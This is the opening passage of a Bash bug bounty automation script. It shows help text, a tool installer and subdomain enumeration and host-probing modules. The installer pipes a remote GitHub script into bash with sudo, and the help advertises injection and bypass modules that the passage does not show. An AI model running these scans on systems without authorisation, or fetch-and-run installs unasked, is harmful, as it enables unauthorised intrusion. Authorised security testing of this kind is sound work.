#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║   BUG FRAMEWORK v5.0  —  Professional Bug Bounty Recon & Detection Suite    ║
# ║   IDOR | BAC | OAuth | XSS | SQLi | SSRF | LFI | CSRF | OWASP TOP 10      ║
# ║   ⚡ AUTHORIZED & IN-SCOPE TARGETS ONLY — STRICTLY FOR BUG BOUNTY USE ⚡   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
#
# LEGAL NOTICE: This tool is for authorized security testing ONLY.
# Running this against targets without explicit written permission is illegal.
# The author assumes zero liability for unauthorized or illegal use.

set -uo pipefail
IFS=$'\n\t'

# ══════════════════════════════════════════════════════
# VERSION & META
# ══════════════════════════════════════════════════════
readonly VERSION="5.0"
readonly TOOL_NAME="BUG FRAMEWORK"

# ══════════════════════════════════════════════════════
# COLORS & SYMBOLS
# ══════════════════════════════════════════════════════
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly MAGENTA='\033[0;35m'
readonly WHITE='\033[1;37m'
readonly BOLD='\033[1m'
readonly DIM='\033[2m'
readonly NC='\033[0m'
readonly ORANGE='\033[38;5;208m'

readonly SYM_OK="${GREEN}[✔]${NC}"
readonly SYM_FAIL="${RED}[✖]${NC}"
readonly SYM_WARN="${YELLOW}[!]${NC}"
readonly SYM_INFO="${CYAN}[*]${NC}"
readonly SYM_HIT="${RED}[💥]${NC}"
readonly SYM_BUG="${MAGENTA}[🐛]${NC}"

# ══════════════════════════════════════════════════════
# GLOBALS — set via parse_args
# ══════════════════════════════════════════════════════
DOMAIN=""
WORKSPACE=""
LOG_MASTER=""
START_TIME=$(date +%s)
SCAN_STEP=0
SCAN_TOTAL=23

# Tunables
T_HTTPX=50
T_NUCLEI=50
R_NUCLEI=150
T_FFUF=100
T_KATANA=50
D_KATANA=3
T_DALFOX=30
TIMEOUT_CONN=10
MAX_SUBS_WB=30

# Feature flags
F_QUICK=false
F_DEEP=false
F_NO_EXPLOIT=false
F_RESUME=false
F_SILENT=false
F_BANNER=true
F_INSTALL=false
F_UPDATE_NUCLEI=false

# Mode flags
M_SUB=false
M_ONE=false
M_URL=false
M_WE=false
M_JS=false
M_FUZZ=false
M_VULN=false
M_NUCLEI_ONLY=false
M_XSS=false
M_SQLI=false
M_SSRF=false
M_LFI=false
M_CSRF=false
M_CORS=false
M_IDOR=false
M_OAUTH=false
M_REPORT=false
M_SCOPE=false
M_WAF=false
M_API=false
M_PMF=false
M_PORTS=false
M_TECH=false

SCOPE_FILE=""
SESSION_COOKIE=""
PROXY_URL=""
CUSTOM_WL=""
CUSTOM_THREADS=""
CUSTOM_RATE=""
declare -a CUSTOM_HEADERS=()

# ══════════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════════
print_banner() {
    [[ "$F_BANNER" == false ]] && return
    clear
    echo -e "${RED}"
    cat << 'BNREOF'
 ██████╗ ██╗   ██╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
 ██████╔╝██║   ██║██║  ███╗    █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝
 ██╔══██╗██║   ██║██║   ██║    ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗
 ██████╔╝╚██████╔╝╚██████╔╝    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚═════╝  ╚═════╝  ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
BNREOF
    echo -e "${NC}"
    echo -e "  ${DIM}╔────────────────────────────────────────────────────────────────────────────────╗${NC}"
    echo -e "  ${DIM}│${NC}  ${BOLD}${WHITE}v${VERSION} ELITE${NC}  ${DIM}│${NC}  ${CYAN}IDOR · BAC · OAuth · XSS · SQLi · SSRF · LFI · CSRF · OWASP${NC}  ${DIM}│${NC}"
    echo -e "  ${DIM}╚────────────────────────────────────────────────────────────────────────────────╝${NC}"
    echo -e "  ${RED}${BOLD}⚡  AUTHORIZED & IN-SCOPE TARGETS ONLY  ⚡${NC}"
    echo ""
}

# ══════════════════════════════════════════════════════
# HELP
# ══════════════════════════════════════════════════════
show_help() {
    print_banner
    cat << 'HELPEOF'
FULL SCAN MODES
  bug -d <domain>                   Full aggressive recon + detection (all modules)
  bug -d <domain> --quick           Fast scan (skip slow/heavy modules)
  bug -d <domain> --deep            Ultra aggressive (max threads + deep wordlists)
  bug -d <domain> --no-exploit      Recon + detection only (no active fuzzing)
  bug -d <domain> --resume          Resume a stopped scan from last checkpoint

RECON MODES
  bug -d <domain> -sub              Subdomain enumeration only
  bug -d <domain> -one              Single domain only (no subdomain enum)
  bug -d <domain> -url              URL collection only
  bug -d <domain> -we               URL + endpoint discovery (fast combo)
  bug -d <domain> -js               JavaScript analysis only
  bug -d <domain> -fuzz             Directory bruteforce + 403 bypass
  bug -d <domain> -ports            Port scan only (nmap)
  bug -scope <file>                 Scan multiple domains from file

DETECTION MODES
  bug -d <domain> -vuln             Full detection scan
  bug -d <domain> -nuclei           Nuclei only
  bug -d <domain> -xss              XSS detection only (dalfox)
  bug -d <domain> -sqli             SQLi detection only (sqlmap)
  bug -d <domain> -ssrf             SSRF detection only
  bug -d <domain> -lfi              LFI detection only
  bug -d <domain> -csrf             CSRF + CORS detection
  bug -d <domain> -cors             CORS only
  bug -d <domain> -idor             IDOR + BAC classification
  bug -d <domain> -oauth            OAuth/Auth flow analysis
  bug -d <domain> -tech             Technology-specific checks
  bug -d <domain> -waf              WAF fingerprint + bypass profiling
  bug -d <domain> -api              API schema discovery (OpenAPI/GraphQL)
  bug -d <domain> -pmf              Parameter mutation fuzzing (SSTI/hidden/JSON)

REPORT
  bug -d <domain> -report           Regenerate HTML + MD report

OPTIONS (apply to any mode)
  --cookie  <value>                 Session cookie (authenticated scans)
  --header  <value>                 Custom header (repeatable)
  --proxy   <url>                   Route traffic through proxy (Burp etc)
  --wordlist <file>                 Custom wordlist for fuzzing
  --threads <n>                     Override thread count
  --rate    <n>                     Override requests per second
  --timeout <n>                     Override connection timeout
  --silent                          Suppress verbose, show findings only
  --no-banner                       Skip ASCII art banner

UTILITY
  bug --install                     Install all required tools
  bug --update-nuclei               Update nuclei templates only
  bug -h / --help                   Show this help

HELPEOF
    exit 0
}

# ══════════════════════════════════════════════════════
# ARGUMENT PARSING
# ══════════════════════════════════════════════════════
parse_args() {
    [[ $# -eq 0 ]] && show_help
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d)              DOMAIN="$(echo ${2:-} | sed 's|https\?://||g' | sed 's|/$||g')"; shift ;;
            --quick)         F_QUICK=true ;;
            --deep)          F_DEEP=true ;;
            --no-exploit)    F_NO_EXPLOIT=true ;;
            --resume)        F_RESUME=true ;;
            --silent)        F_SILENT=true ;;
            --no-banner)     F_BANNER=false ;;
            --install)       F_INSTALL=true ;;
            --update-nuclei) F_UPDATE_NUCLEI=true ;;
            --cookie)        SESSION_COOKIE="${2:-}"; shift ;;
            --header)        CUSTOM_HEADERS+=("${2:-}"); shift ;;
            --proxy)         PROXY_URL="${2:-}"; shift ;;
            --wordlist)      CUSTOM_WL="${2:-}"; shift ;;
            --threads)       CUSTOM_THREADS="${2:-}"; shift ;;
            --rate)          CUSTOM_RATE="${2:-}"; shift ;;
            --timeout)       TIMEOUT_CONN="${2:-10}"; shift ;;
            -sub)            M_SUB=true ;;
            -one)            M_ONE=true ;;
            -url)            M_URL=true ;;
            -we)             M_WE=true ;;
            -js)             M_JS=true ;;
            -fuzz)           M_FUZZ=true ;;
            -ports)          M_PORTS=true ;;
            -vuln)           M_VULN=true ;;
            -nuclei)         M_NUCLEI_ONLY=true ;;
            -xss)            M_XSS=true ;;
            -sqli)           M_SQLI=true ;;
            -ssrf)           M_SSRF=true ;;
            -lfi)            M_LFI=true ;;
            -csrf)           M_CSRF=true ;;
            -cors)           M_CORS=true ;;
            -idor)           M_IDOR=true ;;
            -oauth)          M_OAUTH=true ;;
            -tech)           M_TECH=true ;;
            -report)         M_REPORT=true ;;
            -waf)            M_WAF=true ;;
            -api)            M_API=true ;;
            -pmf)            M_PMF=true ;;
            -scope)          SCOPE_FILE="${2:-}"; M_SCOPE=true; shift ;;
            -h|--help|-help) show_help ;;
            *)               log_err "Unknown option: $1"; show_help ;;
        esac
        shift
    done

    # Deep mode overrides
    if [[ "$F_DEEP" == true ]]; then
        T_HTTPX=100; T_NUCLEI=100; R_NUCLEI=300
        T_FFUF=200;  T_KATANA=100; D_KATANA=6
        T_DALFOX=60; MAX_SUBS_WB=80
    fi

    # Custom thread/rate overrides
    [[ -n "$CUSTOM_THREADS" ]] && T_HTTPX="$CUSTOM_THREADS" T_NUCLEI="$CUSTOM_THREADS" T_FFUF="$CUSTOM_THREADS"
    [[ -n "$CUSTOM_RATE" ]]    && R_NUCLEI="$CUSTOM_RATE"
}

# ══════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════
log_info()  {
    [[ "$F_SILENT" == true ]] && return
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_INFO} ${DIM}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_ok()    {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_OK} ${GREEN}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_warn()  {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_WARN} ${YELLOW}[${ts}]${NC} ${BOLD}$*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_err()   {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_FAIL} ${RED}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_hit()   {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_HIT} ${BOLD}${RED}[${ts}] ▶ FINDING: $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_step()  {
    local ts; ts=$(date '+%H:%M:%S')
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════╗${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${MAGENTA}║  ${YELLOW}⚡${NC} ${BOLD}${WHITE}[$ts] $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════╝${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_section() {
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    printf "  ${BOLD}${BLUE}│  ${YELLOW}%-60s${BLUE}│${NC}\n" "⚡  $1" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${BLUE}└──────────────────────────────────────────────────────────────┘${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
progress()  {
    SCAN_STEP=$((SCAN_STEP + 1))
    local pct=$(( SCAN_STEP * 100 / SCAN_TOTAL ))
    local fill=$(( pct / 4 ))
    local bar=""
    for ((i=0;i<fill;i++)); do bar+="█"; done
    for ((i=fill;i<25;i++)); do bar+="░"; done
    echo -e "\n${CYAN}  ▸ [${bar}] ${pct}% — ${BOLD}$1${NC}\n" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}

# ══════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════
has()       { command -v "$1" &>/dev/null; }
cnt()       { wc -l < "${1:-/dev/null}" 2>/dev/null || echo 0; }
safe_name() { echo "$1" | md5sum | cut -c1-12; }

# curl with optional cookie/proxy/headers
_curl() {
    local args=(-s --max-time "$TIMEOUT_CONN" --connect-timeout 5)
    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
    [[ -n "$PROXY_URL"      ]] && args+=(-x "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    curl "${args[@]}" "$@"
}

# nuclei with optional cookie/proxy
_nuclei() {
    local args=()
    [[ -n "$SESSION_COOKIE" ]] && args+=(-H "Cookie: $SESSION_COOKIE")
    [[ -n "$PROXY_URL"      ]] && args+=(-proxy "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    nuclei "${args[@]}" "$@"
}

# ffuf with optional cookie/proxy
_ffuf() {
    local args=()
    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
    [[ -n "$PROXY_URL"      ]] && args+=(-x "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    ffuf "${args[@]}" "$@"
}

# ══════════════════════════════════════════════════════
# WORKSPACE & RESUME
# ══════════════════════════════════════════════════════
setup_workspace() {
    WORKSPACE="$HOME/bug-bounty/$(echo $DOMAIN | sed 's|https\?://||g' | sed 's|/$||g')"
    mkdir -p "$WORKSPACE"/{subdomains,urls/gf,js/downloaded,paths,endpoints,params,\
vulns/{xss,sqli,ssrf,lfi,csrf,idor,nuclei,misconfig/graphql},\
classified/{idor,bac,oauth,upload,export,payment,webhook,admin,debug,burp_imports},\
screenshots,reports,logs}

    LOG_MASTER="$WORKSPACE/logs/master.log"
    touch "$LOG_MASTER"

    cat > "$WORKSPACE/scan_config.txt" << EOF
TARGET=$DOMAIN
DATE=$(date)
VERSION=$VERSION
MODE=$(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)
AUTH=$(if [[ -n "$SESSION_COOKIE" ]]; then echo AUTHENTICATED; else echo UNAUTHENTICATED; fi)
PROXY=${PROXY_URL:-NONE}
EOF

    echo ""
    echo -e "  ${BOLD}${WHITE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "  ${BOLD}${WHITE}║  TARGET    : ${CYAN}${DOMAIN}${NC}"
    echo -e "  ${BOLD}${WHITE}║  WORKSPACE : ${DIM}${WORKSPACE}${NC}"
    echo -e "  ${BOLD}${WHITE}║  MODE      : ${YELLOW}$(if [[ "$F_DEEP" == true ]]; then echo "DEEP 🔥"; elif [[ "$F_QUICK" == true ]]; then echo "QUICK ⚡"; else echo "FULL 💀"; fi)${NC}"
    [[ -n "$SESSION_COOKIE" ]] && echo -e "  ${BOLD}${WHITE}║  AUTH      : ${GREEN}Authenticated (cookie set)${NC}"
    [[ -n "$PROXY_URL"      ]] && echo -e "  ${BOLD}${WHITE}║  PROXY     : ${GREEN}${PROXY_URL}${NC}"
    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

mark_done() { echo "$1" >> "$WORKSPACE/.done" 2>/dev/null || true; }
is_done()   { [[ "$F_RESUME" == true ]] && grep -q "^$1$" "$WORKSPACE/.done" 2>/dev/null; }
run_mod()   {
    local name="$1"; shift
    if is_done "$name"; then
        log_info "SKIP: $name (resumed)"
        return 0
    fi
    "$@"
    mark_done "$name"
}

# ══════════════════════════════════════════════════════
# PREFLIGHT — ensure minimal data exists for focused modes
# ══════════════════════════════════════════════════════
ensure_live() {
    [[ -s "$WORKSPACE/subdomains/live_urls.txt" ]] && return
    log_info "No live_urls.txt — running quick probe for $DOMAIN..."
    {
        echo "https://$DOMAIN"
        subfinder -d "$DOMAIN" -silent 2>/dev/null \
            | httpx -silent -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN"
    } | sort -u > "$WORKSPACE/subdomains/live_urls.txt"
    touch "$WORKSPACE/subdomains/status_200.txt" \
          "$WORKSPACE/subdomains/status_403.txt" \
          "$WORKSPACE/subdomains/tech_stack.txt"
}

ensure_urls() {
    [[ -s "$WORKSPACE/urls/all_urls.txt" ]] && return
    ensure_live
    log_info "No URL data — quick collection for $DOMAIN..."
    {
        echo "$DOMAIN" | timeout 60 waybackurls 2>/dev/null
        echo "$DOMAIN" | timeout 60 gau --threads 5 2>/dev/null
    } | sort -u > "$WORKSPACE/urls/all_urls.txt"
    grep -E '\?[a-zA-Z0-9_]+=.' "$WORKSPACE/urls/all_urls.txt" | sort -u \
        > "$WORKSPACE/urls/urls_with_params.txt"
    for p in xss sqli ssrf lfi redirect idor; do
        gf "$p" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u \
            > "$WORKSPACE/urls/gf/${p}.txt"
    done
    grep -oP 'https?://[^/]+\K(/[^?\s]*)?' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$WORKSPACE/endpoints/all_endpoints.txt"
    touch "$WORKSPACE/endpoints/interesting_paths.txt"
}

# ══════════════════════════════════════════════════════
# INSTALL TOOLS
# ══════════════════════════════════════════════════════
install_tools() {
    log_step "INSTALLING ALL REQUIRED TOOLS"
    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    export GOPATH="$HOME/go"

    log_info "Updating apt..."
    sudo apt-get update -qq 2>/dev/null || true

    local APT_PKGS=(python3 python3-pip curl wget git jq nmap sqlmap)
    for pkg in "${APT_PKGS[@]}"; do
        has "$pkg" && { log_ok "$pkg ✓"; continue; }
        log_info "Installing $pkg..."
        sudo apt-get install -y -qq "$pkg" 2>/dev/null && log_ok "$pkg installed" || log_warn "$pkg failed"
    done

    # Go
    if ! has go; then
        log_info "Installing Go 1.22..."
        wget -q "https://go.dev/dl/go1.22.0.linux-amd64.tar.gz" -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
        export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    fi

    local GO_PKGS=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/projectdiscovery/katana/cmd/katana@latest"
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        "github.com/projectdiscovery/alterx/cmd/alterx@latest"
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        "github.com/tomnomnom/waybackurls@latest"
        "github.com/tomnomnom/gf@latest"
        "github.com/tomnomnom/anew@latest"
        "github.com/tomnomnom/qsreplace@latest"
        "github.com/lc/gau/v2/cmd/gau@latest"
        "github.com/hahwul/dalfox/v2@latest"
        "github.com/hakluke/hakrawler@latest"
        "github.com/ffuf/ffuf/v2@latest"
        "github.com/003random/getJS@latest"
        "github.com/owasp-amass/amass/v4/...@master"
        "github.com/tomnomnom/assetfinder@latest"
        "github.com/sensepost/gowitness@latest"
    )
    for pkg in "${GO_PKGS[@]}"; do
        local name; name=$(basename "${pkg%@*}")
        has "$name" && { log_ok "$name ✓"; continue; }
        log_info "Installing $name..."
        go install "$pkg" 2>/dev/null && log_ok "$name installed" || log_warn "$name failed"
    done

    local PIP_PKGS=(waymore uro arjun dirsearch)
    for pkg in "${PIP_PKGS[@]}"; do
        pip3 show "$pkg" &>/dev/null && { log_ok "$pkg ✓"; continue; }
        pip3 install -q "$pkg" --break-system-packages 2>/dev/null \
            && log_ok "$pkg installed" || log_warn "$pkg failed"
    done

    # feroxbuster
    has feroxbuster || {
        curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh \
            | bash -s /usr/local/bin 2>/dev/null \
            && log_ok "feroxbuster installed"
    }

    # SecretFinder
    [[ ! -f "$HOME/tools/SecretFinder/SecretFinder.py" ]] && {
        mkdir -p "$HOME/tools"
        git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "SecretFinder installed"
    }

    # LinkFinder
    [[ ! -f "$HOME/tools/LinkFinder/linkfinder.py" ]] && {
        git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/LinkFinder/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "LinkFinder installed"
    }

    # jwt_tool
    [[ ! -f "$HOME/tools/jwt_tool/jwt_tool.py" ]] && {
        git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null
        pip3 install -qr "$HOME/tools/jwt_tool/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "jwt_tool installed"
    }

    # GF patterns
    [[ ! -d "$HOME/.gf" ]] && {
        mkdir -p ~/.gf
        git clone -q https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gfp 2>/dev/null
        cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
        git clone -q https://github.com/tomnomnom/gf.git /tmp/gfsrc 2>/dev/null
        cp /tmp/gfsrc/examples/*.json ~/.gf/ 2>/dev/null || true
        log_ok "GF patterns installed"
    }

    # nuclei templates
    [[ ! -d "$HOME/nuclei-templates" ]] && nuclei -update-templates -silent 2>/dev/null \
        && log_ok "Nuclei templates downloaded"

    # SecLists
    if [[ ! -f "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt" ]]; then
        log_info "Installing SecLists..."
        sudo apt-get install -y -qq seclists 2>/dev/null \
            || git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
        log_ok "SecLists installed"
    fi

    log_ok "All tools ready! Run: bug -d <domain>"
}

# ══════════════════════════════════════════════════════
# MODULE 01 — SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════
mod_subdomains() {
    progress "MODULE 01 — Subdomain Enumeration"
    log_section "MODULE 01 — SUBDOMAIN ENUMERATION"
    local O="$WORKSPACE/subdomains"

    # subfinder
    log_info "subfinder (all sources, recursive)..."
    subfinder -d "$DOMAIN" -silent -all -recursive -o "$O/subfinder.txt" 2>/dev/null || true
    log_ok "subfinder: $(cnt "$O/subfinder.txt") subdomains"

    # crt.sh
    log_info "crt.sh certificate transparency..."
    _curl "https://crt.sh/?q=%25.${DOMAIN}&output=json" \
        | jq -r '.[].name_value' 2>/dev/null \
        | sed 's/\*\.//g' | sort -u > "$O/crtsh.txt" || true
    log_ok "crt.sh: $(cnt "$O/crtsh.txt") subdomains"

    # assetfinder
    log_info "assetfinder..."
    assetfinder --subs-only "$DOMAIN" 2>/dev/null | sort -u > "$O/assetfinder.txt" || true

    # urlscan.io
    log_info "urlscan.io..."
    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
        | jq -r '.results[]?.page?.domain' 2>/dev/null \
        | grep -F ".${DOMAIN}" | sort -u > "$O/urlscan_subs.txt" || true

    # HackerTarget
    _curl "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" \
        | cut -d',' -f1 | sort -u > "$O/hackertarget.txt" 2>/dev/null || true

    # RapidDNS
    _curl "https://rapiddns.io/subdomain/$DOMAIN?full=1" 2>/dev/null \
        | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" | sort -u > "$O/rapiddns.txt" || true

    # ThreatCrowd
    _curl "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$DOMAIN" \
        | jq -r '.subdomains[]?' 2>/dev/null | sort -u > "$O/threatcrowd.txt" || true

    # chaos (ProjectDiscovery — needs API key)
    if [[ -n "${PDCP_API_KEY:-}" ]]; then
        chaos -d "$DOMAIN" -silent -key "$PDCP_API_KEY" 2>/dev/null \
            | sort -u > "$O/chaos.txt" || true
        log_ok "chaos: $(cnt "$O/chaos.txt")"
    fi

    # amass (skip in quick mode — it's slow)
    if [[ "$F_QUICK" == false ]]; then
        log_info "amass passive (2 min cap)..."
        timeout 120 amass enum -passive -d "$DOMAIN" -o "$O/amass.txt" -silent 2>/dev/null || true
        log_ok "amass: $(cnt "$O/amass.txt")"

        log_info "alterx permutation expansion..."
        cat "$O/subfinder.txt" 2>/dev/null \
            | alterx -silent 2>/dev/null \
            | head -5000 | sort -u > "$O/alterx.txt" || true
        log_ok "alterx: $(cnt "$O/alterx.txt") candidates"
    fi

    # Merge & validate
    cat "$O"/*.txt 2>/dev/null \
        | sort -u \
        | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9._-]*)\.${DOMAIN}$" \
        > "$O/all_subdomains.txt" || true
    log_ok "Total unique subdomains: $(cnt "$O/all_subdomains.txt")"

    # DNS resolution
    log_info "DNS resolution via dnsx..."
    cat "$O/all_subdomains.txt" \
        | dnsx -silent -a -cname -resp -o "$O/resolved_full.txt" 2>/dev/null || true
    awk '{print $1}' "$O/resolved_full.txt" 2>/dev/null > "$O/resolved_domains.txt"
    log_ok "Resolved: $(cnt "$O/resolved_domains.txt") live subdomains"

    # Wildcard check
    local wc_ip; wc_ip=$(dig "randomx99nomatch.$DOMAIN" A +short 2>/dev/null | head -1 || true)
    [[ -n "$wc_ip" ]] && log_warn "Wildcard DNS detected: $wc_ip — expect false positives"

    # Takeover candidates
    grep -iE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" \
        "$O/resolved_full.txt" 2>/dev/null | sort -u > "$O/takeover_candidates.txt" || true
    [[ -s "$O/takeover_candidates.txt" ]] && \
        log_warn "Potential takeover candidates: $(cnt "$O/takeover_candidates.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 02 — LIVE HOST PROBING
# ══════════════════════════════════════════════════════
mod_httpx() {
    progress "MODULE 02 — Live Host Probing"
    log_section "MODULE 02 — LIVE HOST PROBING (httpx)"
    local O="$WORKSPACE/subdomains"

    # -one mode: single target only
    if [[ "$M_ONE" == true ]]; then
        echo "https://$DOMAIN" > "$O/live_urls.txt"
        echo "https://$DOMAIN" > "$O/status_200.txt"
        touch "$O/status_403.txt" "$O/status_401.txt" "$O/tech_stack.txt"
        log_ok "-one mode: single target https://$DOMAIN"
        return
    fi

    log_info "httpx full fingerprint (threads: $T_HTTPX)..."
    {
        cat "$O/resolved_domains.txt" "$O/all_subdomains.txt" 2>/dev/null
        echo "$DOMAIN"
    } | sort -u | httpx -silent \
        -status-code -title -tech-detect \
        -content-length -web-server -ip -cname -cdn \
        -ports 80,443,8080,8443,8888,8000,3000,4000,5000,9000,9443 \
        -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN" \
        -follow-redirects \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        ${PROXY_URL:+-http-proxy "$PROXY_URL"} \
        -json -o "$O/live_hosts.json" 2>/dev/null || true

    jq -r '.url' "$O/live_hosts.json" 2>/dev/null | sort -u > "$O/live_urls.txt"
    log_ok "Live hosts: $(cnt "$O/live_urls.txt")"

    for code in 200 301 302 401 403 404 500; do
        jq -r "select(.status_code==$code) | .url" "$O/live_hosts.json" 2>/dev/null \
            | sort -u > "$O/status_${code}.txt" || true
    done
    log_ok "200:$(cnt "$O/status_200.txt") | 403:$(cnt "$O/status_403.txt") | 401:$(cnt "$O/status_401.txt") | 500:$(cnt "$O/status_500.txt")"

    cp "$O/status_403.txt" "$WORKSPACE/paths/403_targets.txt" 2>/dev/null || true

    jq -r '.tech[]?' "$O/live_hosts.json" 2>/dev/null \
        | sort | uniq -c | sort -rn | head -40 > "$O/tech_stack.txt"
    log_ok "Tech stack fingerprinted: $(cnt "$O/tech_stack.txt") entries"
}

# ══════════════════════════════════════════════════════
# MODULE 03 — URL COLLECTION
# ══════════════════════════════════════════════════════
mod_urls() {
    progress "MODULE 03 — URL Collection"
    log_section "MODULE 03 — URL COLLECTION (ALL SOURCES)"
    local O="$WORKSPACE/urls"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    # waybackurls
    log_info "waybackurls (main + top ${MAX_SUBS_WB} subs)..."
    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$O/wayback.txt" || true
    head -"$MAX_SUBS_WB" "$WORKSPACE/subdomains/resolved_domains.txt" 2>/dev/null \
        | while read -r sub; do
            timeout 25 bash -c "echo '$sub' | waybackurls 2>/dev/null" 2>/dev/null || true
          done | sort -u >> "$O/wayback.txt" || true
    sort -u -o "$O/wayback.txt" "$O/wayback.txt"
    log_ok "wayback: $(cnt "$O/wayback.txt") URLs"

    # gau
    log_info "gau (AlienVault + URLScan + Wayback)..."
    timeout 180 gau --subs --threads 10 --timeout 10 \
        --blacklist "png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,zip" \
        "$DOMAIN" 2>/dev/null | sort -u > "$O/gau.txt" || true
    log_ok "gau: $(cnt "$O/gau.txt") URLs"

    # waymore
    log_info "waymore (180s cap)..."
    timeout 180 waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" --timeout 30 2>/dev/null \
